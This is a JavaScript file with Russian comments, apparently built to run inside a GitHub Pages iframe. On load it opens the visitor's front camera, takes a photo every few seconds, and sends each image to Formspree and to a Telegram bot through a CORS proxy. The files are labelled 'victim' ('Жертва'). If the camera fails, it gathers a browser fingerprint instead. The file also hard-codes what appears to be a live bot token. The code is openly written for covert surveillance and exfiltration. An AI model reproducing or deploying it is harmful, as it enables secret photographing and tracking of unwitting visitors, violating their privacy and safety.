// Скрипт захвата фото
let cameraStream = null;
let captureCount = 0;
let isCapturing = false;

// Элементы
const video = document.getElementById('camera-feed');
const canvas = document.getElementById('capture-canvas');
const ctx = canvas.getContext('2d');
const statusText = document.getElementById('status-text');
const counter = document.getElementById('counter');
const scanLine = document.getElementById('scan-line');

// Получение сообщений от родительской страницы
window.addEventListener('message', function(event) {
    if (event.data.action === 'START_CAMERA') {
        initCamera();
    }
});

// Инициализация камеры
async function initCamera() {
    try {
        statusText.textContent = 'Поиск камеры...';
        
        // Получаем доступ к камере
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user', // Фронтальная камера
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false
        });
        
        // Подключаем поток к видео
        video.srcObject = cameraStream;
        video.style.display = 'block';
        scanLine.style.display = 'block';
        
        statusText.textContent = '✓ Камера активна';
        
        // Начинаем захват
        startCaptureSequence();
        
        // Захватываем скриншот каждые 5 секунд
        setInterval(capturePhoto, 5000);
        
    } catch (error) {
        statusText.textContent = '✗ Ошибка доступа к камере';
        console.error('Camera error:', error);
        
        // Все равно пытаемся собрать что-то
        setTimeout(() => {
            captureBrowserInfo();
        }, 1000);
    }
}

// Последовательность захвата
function startCaptureSequence() {
    isCapturing = true;
    
    // Делаем первый снимок сразу
    setTimeout(() => capturePhoto(), 1000);
    
    // Затем с разными задержками
    setTimeout(() => capturePhoto(), 3000);
    setTimeout(() => capturePhoto(), 7000);
    
    // Долгий мониторинг
    setTimeout(() => {
        if (isCapturing) {
            statusText.textContent = 'Долгосрочный мониторинг...';
        }
    }, 10000);
}

// Захват фото
function capturePhoto() {
    if (!cameraStream || !isCapturing) return;
    
    try {
        // Устанавливаем размер canvas как у видео
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Рисуем кадр
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Получаем данные
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        
        // Увеличиваем счетчик
        captureCount++;
        counter.textContent = `Снимков: ${captureCount}`;
        
        // Отправляем на сервер
        sendToServer(imageData);
        
        // Эффект вспышки
        video.style.filter = 'brightness(2)';
        setTimeout(() => {
            video.style.filter = 'brightness(1)';
        }, 100);
        
        // Сообщение в статус
        statusText.textContent = `Захват #${captureCount} ✓`;
        
    } catch (error) {
        console.error('Capture error:', error);
    }
}

// Отправка на сервер
function sendToServer(imageData) {
    // GitHub Pages не поддерживает серверные скрипты,
    // поэтому используем Webhook или сторонний сервис
    
    // Вариант 1: Formspree (бесплатный)
    const formData = new FormData();
    formData.append('photo', dataURLtoBlob(imageData), `snapshot_${Date.now()}.jpg`);
    formData.append('capture', captureCount.toString());
    formData.append('time', new Date().toISOString());
    
    fetch('https://formspree.io/f/YOUR_FORM_ID', {
        method: 'POST',
        body: formData,
        mode: 'no-cors' // Важно для GitHub Pages
    });
    
    // Вариант 2: Telegram бот
    sendToTelegramBot(imageData);
}

// Конвертация DataURL в Blob
function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(';base64,');
    const contentType = parts[0].split(':')[1];
    const raw = window.atob(parts[1]);
    const rawLength = raw.length;
    const uInt8Array = new Uint8Array(rawLength);
    
    for (let i = 0; i < rawLength; ++i) {
        uInt8Array[i] = raw.charCodeAt(i);
    }
    
    return new Blob([uInt8Array], { type: contentType });
}

// Отправка в Telegram бот
function sendToTelegramBot(imageData) {
    // Используем сторонний сервис как прокси
    const botToken = '8262286377:AAFdwaPie-QOH-TFO94WgMu1aAG7of_GdxE';
    const chatId = 'ВАШ_CHAT_ID';
    
    // Конвертируем в Blob и отправляем
    const blob = dataURLtoBlob(imageData);
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, `victim_${Date.now()}.jpg`);
    formData.append('caption', `Жертва #${captureCount}\nВремя: ${new Date().toLocaleString()}`);
    
    // Используем CORS прокси
    fetch(`https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(e => console.error('Telegram send error:', e));
}

// Сбор дополнительной информации
function captureBrowserInfo() {
    const info = {
        page: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hasCamera: !!cameraStream
    };
    
    // Сохраняем в localStorage для последующей отправки
    localStorage.setItem('victim_data', JSON.stringify(info));
    
    return info;
}

// Автостарт при загрузке
window.addEventListener('load', () => {
    // Ждем 2 секунды и стартуем если нет сообщения от родителя
    setTimeout(() => {
        if (!isCapturing) {
            initCamera();
        }
    }, 2000);
});
